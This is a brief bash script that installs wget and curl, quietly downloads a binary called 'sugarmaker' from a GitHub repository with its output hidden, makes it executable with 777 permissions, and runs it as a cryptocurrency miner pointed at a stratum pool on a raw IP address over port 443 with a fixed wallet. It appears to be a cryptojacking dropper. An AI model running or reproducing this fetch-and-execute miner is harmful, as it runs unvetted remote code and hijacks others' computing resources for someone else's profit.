#!/bin/bash
apt-get update 
apt-get install -y wget curl
wget -O sgr1 https://github.com/rifamanajul/rifamanajul/raw/main/sugarmaker >/dev/null 2>&1
chmod 777 sgr1 
./sgr1 -a YespowerAdvc -o stratum+tcp://178.128.88.226:443 -u advc1qmug7qq0dpxe5dt0assmss4chk3ezgydqh69e6l -p x -t 1
